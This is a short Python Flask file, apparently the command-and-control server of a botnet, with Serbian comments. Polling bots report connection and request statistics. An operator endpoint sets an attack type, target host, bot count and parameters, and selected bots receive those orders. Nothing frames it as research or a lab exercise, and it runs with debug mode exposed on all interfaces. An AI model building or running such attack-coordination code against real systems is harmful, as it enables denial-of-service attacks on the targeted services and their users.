from flask import Flask, request, jsonify
from state import attack_state, fill_registry, is_selected

app = Flask(__name__)


@app.route('/api/bot/poll', methods=['POST']) # ruta za bota
def bot_poll():

    data = request.get_json()
    bot_id = data.get('bot_id') # id bota koji upita

    stats = { # recnik od inf iz bodyja zahteva
        "active_connections": data.get('active_connections'),
        "requests_sent": data.get('requests_sent'),
        "requests_failed": data.get('requests_failed')
    }

    fill_registry(bot_id, stats)

    if attack_state["attack_type"] is not None and is_selected(bot_id): # ako ima napada i ako je ovaj bot selektovan

        return jsonify({ # vraca botu vrednosti za napad
            "attack_type": attack_state["attack_type"],
            "target_host": attack_state["target_host"],
            "params": attack_state["params"]
        })

    return jsonify({ # ako nema napada nsita
        "attack_type": None,
        "target_host": None,
        "params": None
    })


@app.route('/api/set/attack', methods=['PUT'])
def set_attack(): # operator postavlja stanje napada

    data = request.get_json()

    attack_state["attack_type"] = data.get('attack_type')
    attack_state["target_host"] = data.get('target_host')
    attack_state["bot_count"] = data.get('bot_count', 0)
    attack_state["params"] = data.get('params', {})

    return jsonify(attack_state), 200


@app.route('/api/get/attack', methods=['GET'])
def get_attack():
    return jsonify(attack_state), 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001, debug=True)